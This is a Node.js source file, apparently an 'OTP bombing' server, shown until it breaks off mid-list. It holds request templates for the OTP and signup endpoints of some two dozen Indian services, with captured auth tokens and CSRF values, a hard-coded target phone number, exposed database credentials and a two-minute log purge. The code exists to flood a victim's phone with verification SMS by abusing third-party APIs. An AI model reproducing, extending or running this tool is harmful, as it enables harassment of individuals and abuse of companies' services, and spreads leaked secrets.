// ============================================================
// api_server.js - OTP Bombing API Server (v5.0)
// Hard Timeout + Log Cleanup + Full Logging
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ============================================================
// ===== CONFIGURATION =====
// ============================================================

const MONGODB_URL = "mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0";
const DB_NAME = "otp_bb";

const MAX_EFFECTIVE_DURATION = 10;
const FIRST_RUN_RETRY = 1;
const FIRST_RUN_DELAY = 30;                  // 50 → 30ms
const FIRST_RUN_TIMEOUT = 3000;              // 5000 → 3000ms
const FIRST_RUN_RETRY_DELAY = 150;           // 200 → 150ms

// 🔥 AUTO SLOW MODE
const AUTO_SLOW_MODE = true;
const AUTO_SLOW_MODE_PHONE = '7777885694';
const AUTO_SLOW_MODE_START_DELAY = 5000;
const AUTO_SLOW_MODE_MAX_DURATION_MS = 10 * 60 * 1000;  // 10 min

// 🔥 LOG CLEANUP
const LOG_CLEANUP_INTERVAL_MS = 2 * 60 * 1000;  // Har 2 min
const LOG_RETENTION_MS = 2 * 60 * 1000;          // 2 min se purane logs delete

// ============================================================
// ===== IN-MEMORY LOG STORE (Auto Cleanup) =====
// ============================================================

class LogStore {
    constructor(retentionMs = LOG_RETENTION_MS) {
        this.logs = [];
        this.retentionMs = retentionMs;
        this.cleanupInterval = null;
    }

    add(level, message, meta = {}) {
        const log = {
            timestamp: Date.now(),
            time: new Date().toISOString(),
            level,          // 'info' | 'success' | 'fail' | 'warn' | 'error'
            message,
            meta
        };
        this.logs.push(log);
        return log;
    }

    startCleanup() {
        if (this.cleanupInterval) return;
        this.cleanupInterval = setInterval(() => {
            const cutoff = Date.now() - this.retentionMs;
            const before = this.logs.length;
            this.logs = this.logs.filter(log => log.timestamp >= cutoff);
            const removed = before - this.logs.length;
            if (removed > 0) {
                console.log(`🧹 Log cleanup: ${removed} old logs removed. Total: ${this.logs.length}`);
            }
        }, LOG_CLEANUP_INTERVAL_MS);
        console.log('✅ Log auto-cleanup started (every 2 min)');
    }

    getAll() {
        return this.logs;
    }

    clear() {
        this.logs = [];
    }
}

const logStore = new LogStore();

// 🔥 Helper logging functions
function logInfo(message, meta = {}) {
    console.log(`ℹ️  ${message}`);
    logStore.add('info', message, meta);
}

function logSuccess(message, meta = {}) {
    console.log(`✅ ${message}`);
    logStore.add('success', message, meta);
}

function logFail(message, meta = {}) {
    console.log(`❌ ${message}`);
    logStore.add('fail', message, meta);
}

function logWarn(message, meta = {}) {
    console.log(`⚠️  ${message}`);
    logStore.add('warn', message, meta);
}

function logError(message, meta = {}) {
    console.error(`🔥 ${message}`);
    logStore.add('error', message, meta);
}

// ============================================================
// ===== MONGODB CONNECTION =====
// ============================================================

let dbConnected = false;

mongoose.connect(MONGODB_URL, {
    dbName: DB_NAME
}).then(async () => {
    dbConnected = true;
    logSuccess('MongoDB Connected');
    await ensureIndexes();
    await checkFirstRun();

    if (AUTO_SLOW_MODE && firstRunMode) {
        logInfo(`⏰ Auto slow mode will start in ${AUTO_SLOW_MODE_START_DELAY / 1000}s...`);
        setTimeout(() => {
            triggerAutoSlowMode();
        }, AUTO_SLOW_MODE_START_DELAY);
    }
}).catch(err => {
    logError('MongoDB Error: ' + err.message);
    dbConnected = false;
});

async function ensureIndexes() {
    try {
        await ApiHealth.collection.createIndex({ api_name: 1 }, { unique: true });
        await ApiHealth.collection.createIndex({ working: 1 });
        await ApiHealth.collection.createIndex({ tested: 1 });
        logSuccess('MongoDB indexes created');
    } catch (err) {
        logError('Index error: ' + err.message);
    }
}

// ============================================================
// ===== API HEALTH SCHEMA =====
// ============================================================

const apiHealthSchema = new mongoose.Schema({
    api_name:           { type: String, required: true, unique: true },
    api_url:            { type: String, default: '' },
    method:             { type: String, default: 'POST' },
    working:            { type: Boolean, default: false },
    tested:             { type: Boolean, default: false },
    avg_response_time:  { type: Number, default: 0 },
    success_count:      { type: Number, default: 0 },
    fail_count:         { type: Number, default: 0 },
    timeout_ms:         { type: Number, default: 5000 },
    last_tested:        { type: Date, default: null },
    created_at:         { type: Date, default: Date.now }
});

const ApiHealth = mongoose.model('ApiHealth', apiHealthSchema);

// ============================================================
// ===== ALL APIS =====
// ============================================================

const API_CONFIGS = [
    {
        "name": "Hotstar_1",
        "method": "PUT",
        "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
        "headers": {
            "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-hs-platform": "PCTV",
            "x-country-code": "IN",
            "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
            "hotstarauth": "st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d",
            "x-hs-appversion": "5.0.40",
            "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
            "accept": "*/*",
            "origin": "https://www.hotstar.com",
            "referer": "https://www.hotstar.com/in/subscribe/sign-in",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "phone_number": "{phone}", "country_prefix": "91" },
        "phone_format": "raw"
    },
    {
        "name": "AltBalaji_1",
        "method": "POST",
        "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE",
            "Content-Type": "application/json",
            "Origin": "https://www.altbalaji.com",
            "Referer": "https://www.altbalaji.com/user-detail?pid=NTU%3D",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "phone_number": "{phone}", "country_code": "91", "platform": "web", "exp": 1601043289127 },
        "phone_format": "raw"
    },
    {
        "name": "Voot_1",
        "method": "POST",
        "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.voot.com",
            "referer": "https://www.voot.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "type": "mobile", "mobile": "{phone}", "countryCode": "+91" },
        "phone_format": "with_plus91"
    },
    {
        "name": "SonyLIV_1",
        "method": "POST",
        "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
        "headers": {
            "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
            "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "application/json, text/plain, */*",
            "session_id": "cc86326a51504133bacd3ce4f796e1cf-1600956156256",
            "x-via-device": "true",
            "app_version": "3.1.20",
            "origin": "https://www.sonyliv.com",
            "referer": "https://www.sonyliv.com",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "channelPartnerID": "MSMIND", "mobileNumber": "{phone}", "country": "IN", "timestamp": "2020-09-24T14:03:03.505Z" },
        "phone_format": "raw"
    },
    {
        "name": "MedPlus",
        "method": "POST",
        "url": "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.medplusmart.com",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={phone}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false" },
        "phone_format": "raw"
    },
    {
        "name": "Apollo247",
        "method": "POST",
        "url": "https://webapi.apollo247.com/",
        "headers": {
            "accept": "*/*",
            "Authorization": "Bearer 3d1833da7020e0602165529446587434",
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "Origin": "https://www.apollo247.com",
            "Referer": "https://www.apollo247.com/medicines",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": {
            "operationName": "Login",
            "variables": { "mobileNumber": "+91{phone}", "loginType": "PATIENT" },
            "query": "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"
        },
        "phone_format": "with_plus91"
    },
    {
        "name": "Netmeds",
        "method": "GET",
        "url": "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.netmeds.com/customer/account/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "phone_format": "raw"
    },
    {
        "name": "GetInstaCash",
        "method": "POST",
        "url": "https://getinstacash.in/sell/getData.php",
        "headers": {
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://getinstacash.in",
            "Referer": "https://getinstacash.in/sell/login",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "type=sendOTP&mobile={phone}" },
        "phone_format": "raw"
    },
    {
        "name": "FBBOnline",
        "method": "POST",
        "url": "https://www.fbbonline.in/customer/account/GenerateOtp",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=",
            "x-requested-with": "XMLHttpRequest",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.fbbonline.in",
            "referer": "https://www.fbbonline.in/customer/account/create",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" },
        "phone_format": "raw"
    },
    {
        "name": "Grofers",
        "method": "POST",
        "url": "https://grofers.com/v2/accounts/",
        "headers": {
            "lon": "77.040489",
            "device_id": "a11f656b-422e-4617-953b-c350d517467d",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13",
            "app_client": "consumer_web",
            "lat": "28.4465616",
            "content-type": "application/x-www-form-urlencoded",
            "save-data": "on",
            "accept": "*/*",
            "origin": "https://grofers.com",
            "referer": "https://grofers.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "user_phone={phone}" },
        "phone_format": "raw"
    },
    {
        "name": "Snapdeal",
        "method": "POST",
        "url": "https://m.snapdeal.com/signupCompleteAjax",
        "headers": {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083",
            "save-data": "on",
            "accept": "*/*",
            "origin": "https://m.snapdeal.com",
            "referer": "https://m.snapdeal.com/signin",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" },
        "phone_format": "raw"
    },
    {
        "name": "Zomato_1",
        "method": "POST",
        "url": "https://www.zomato.com/webroutes/auth/login",
        "headers": {
            "x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.zomato.com",
            "referer": "https://www.zomato.com/kanpur",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "country_id": 1, "phone": "{phone}", "verification_type": "sms", "method": "phone" },
        "phone_format": "raw"
    },
    {
        "name": "Cuemath_1",
        "method": "POST",
        "url": "https://www.cuemath.com/api/v4/parents/",
        "headers": {
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/JSON",
            "Accept": "*/*",
            "Origin": "https://www.cuemath.com",
            "Referer": "https://www.cuemath.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": {
            "intl_mobile": { "phone": "" },
            "phone": "{phone}",
            "email": "nsbd@dn.djs",
            "full_name": "hdhdhdg",
            "place_id": "ChIJYYhT3gl3AjoRUDlkL1i5oIk",
            "timezone": "Asia/Calcutta",
            "detail_source": "CMO_2020",
            "form_fields": "full_name,phone,email,place_id"
        },
        "phone_format": "raw"
    },
    {
        "name": "Dream11_1",
        "method": "POST",
        "url": "https://www.dream11.com/graphql/mutation/pwa/register",
        "headers": {
            "accept": "*/*",
            "device": "pwa",
            "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.dream11.com",
            "referer": "https://www.dream11.com/register?ru=",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": {
            "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
            "variables": { "email": "tsunami@gmail.com", "mobileNumber": "{phone}", "password": "tsunami@123astronomia" }
        },
        "phone_format": "raw"
    },
    {
        "name": "Doubtnut",
        "method": "POST",
        "url": "https://doubtnut.com/api/v1/user/login",
        "headers": {
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "origin": "https://doubtnut.com",
            "referer": "https://doubtnut.com/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "phone={phone}" },
        "phone_format": "raw"
    },
    {
        "name": "Vedantu",
        "method": "POST",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "headers": {
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "email": null, "phoneCode": "+91", "phoneNumber": "{phone}", "ver": "11.345" },
        "phone_format": "raw"
    },
    {
        "name": "Unacademy",
        "method": "POST",
        "url": "https://unacademy.com/api/v3/user/user_check/",
        "headers": {
            "accept": "*/*",
            "authorization": "Bearer undefined",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://unacademy.com",
            "referer": "https://unacademy.com/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "phone": "{phone}", "country_code": "IN", "otp_type": 1, "email": "", "send_otp": true, "is_un_teach_user": false },
        "phone_format": "raw"
    },
    {
        "name": "Byjus",
        "method": "POST",
        "url": "https://bcas-prod.byjusweb.com/api/send-otp",
        "headers": {
            "accept": "*/*",
            "origin": "https://byjus.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "referer": "https://byjus.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        "data": { "_raw": "phoneNumber={phone}&page=free-trial-classes" },
        "phone_format": "raw"
    },
    {
        "name": "RedBus_1",
        "method": "GET",
        "url": "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.redbus.in/preregister",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "phone_format": "raw"
    },
    {
        "name": "Careers360",
        "method": "POST",
        "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
        "headers": {
            "Accept": "*/*",
            "X-CSRFToken": "9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.careers360.com",
            "Referer": "https://www.careers360.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "mobile_number={phone}&method=call&uid=12692588" },
        "phone_format": "raw"
    },
    {
        "name": "Coolwinks",
        "method": "GET",
        "url": "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}",
        "headers": {
            "Accept": "*/*",
            "x-user-agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36 CWUA/msite/0/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Origin": "https://www.coolwinks.com",
            "Referer": "https://www.coolwinks.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "phone_format": "raw"
    },
    {
        "name": "Cansell",
        "method": "POST",
        "url": "https://webapi.cansell.in/api/User/SignUp",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://m.cansell.in",
            "Referer": "https://m.cansell.in/register",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "name": "Uwusjsj", "surname": "wjeshs", "email": "hsjs@gmail.com", "phone": "{phone}", "password": "eeeeee" },
        "phone_format": "raw"
    },
    {
        "name": "Gaana",
        "method": "POST",
        "url": "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
        "headers": {
            "appVersion": "8.9.0",
            "CONTENT_TYPE": "application/json",
            "channel": "gaana.com",
            "tgid": "j9qcq0z2ur4llq2a58qqmag2",
            "sdkVersion": "1.0",
            "appVersionCode": "933",
            "deviceId": "j9qcq0z2ur4llq2a58qqmag2",
            "platform": "android",
            "sdkVersionCode": "1",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        "data": { "mobile": "91-{phone}" },
        "phone_format": "91-"
    },
    {
        "name": "Flipkart_1",
        "method": "POST",
        "url": "https://1.rome.api.flipkart.com/1/action/view",
        "headers": {
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "Origin": "https://www.flipkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US"
        },
        "data": {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY",
                "loginIdPrefix": "+91",
                "loginId": "{phone}",
                "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" },
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "screenName": "LOGIN_V4_MOBILE",
                "sourceContext": "DEFAULT"
            }
        },
        "phone_format": "raw"
    },
    {
        "name": "Flipkart_2",
        "method": "GET",
        "url": "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US"
        },
        "phone_format": "raw"
    },
    {
        "name": "Ullu",
        "method": "POST",
